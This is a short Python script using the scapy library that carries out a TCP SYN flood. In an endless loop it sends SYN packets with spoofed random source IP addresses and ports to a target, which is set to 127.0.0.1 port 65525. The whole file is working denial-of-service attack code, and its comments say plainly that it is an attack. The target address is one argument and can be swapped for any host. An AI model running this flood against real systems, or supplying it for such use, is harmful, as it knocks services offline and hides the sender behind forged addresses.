# Import necessary libraries
from random import randint
from sys import stdout
from scapy.all import *
from scapy.layers.inet import IP, TCP

# Define a function for the TCP SYN flood attack
def tcp_syn_flood_attack(ip_address, dport, num_req):
    sport = RandShort()  # Generate a random source port number for the packet
    s_addr = RandIP()  # Generate a random source IP address for the packet
    
    d_addr = ip_address  # Define the destination IP address of the server (127.0.0.1)
    
    # Create a packet with IP and TCP headers, setting the SYN flag to initiate a TCP handshake
    packet = IP(src=s_addr, dst=d_addr) / TCP(sport=sport, dport=dport, seq=num_req, flags="S")
    
    # Send the packet
    send(packet)

# Continuously execute the TCP SYN flood attack
while True:  # An infinite loop to keep generating and sending packets
    tcp_syn_flood_attack("127.0.0.1", 65525, 100000)  # Initiate the attack by calling the function


